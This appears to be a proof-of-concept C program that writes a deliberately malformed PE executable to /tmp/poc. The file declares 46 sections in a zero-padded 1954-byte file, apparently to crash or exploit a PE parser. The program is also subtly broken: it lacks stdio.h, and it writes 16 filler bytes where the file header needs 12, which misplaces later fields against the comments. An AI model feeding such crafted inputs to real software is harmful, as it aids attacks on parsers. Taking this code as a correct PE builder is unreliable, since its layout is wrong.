#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Create a PE file of exactly 1954 bytes
    // DOS header (64 bytes)
    for (int i = 0; i < 64; i++) {
        if (i == 0) fputc(0x4d, f);
        else if (i == 1) fputc(0x5a, f);
        else if (i == 60) fputc(0x80, f);
        else if (i == 61) fputc(0x00, f);
        else if (i == 62) fputc(0x00, f);
        else if (i == 63) fputc(0x00, f);
        else fputc(0x00, f);
    }

    // Padding to reach offset 0x80 (64 bytes)
    for (int i = 0; i < 64; i++) fputc(0x00, f);

    // PE signature "PE\0\0"
    fputc(0x50, f); fputc(0x45, f); fputc(0x00, f); fputc(0x00, f);

    // File header (20 bytes)
    fputc(0x4c, f); fputc(0x01, f); // Machine = I386 (0x014c)
    fputc(0x2e, f); fputc(0x00, f); // NumberOfSections = 46
    for (int i = 0; i < 16; i++) fputc(0x00, f); // rest of file header
    fputc(0xe0, f); fputc(0x00, f); // SizeOfOptionalHeader = 224
    fputc(0x02, f); fputc(0x01, f); // Characteristics

    // Optional header (224 bytes for PE32)
    fputc(0x0b, f); fputc(0x01, f); // Magic = PE32 (0x10b)
    for (int i = 2; i < 224; i++) fputc(0x00, f);

    // Pad to exactly 1954 bytes
    long pos = ftell(f);
    for (long i = pos; i < 1954; i++) fputc(0x00, f);

    fclose(f);
    return 0;
}

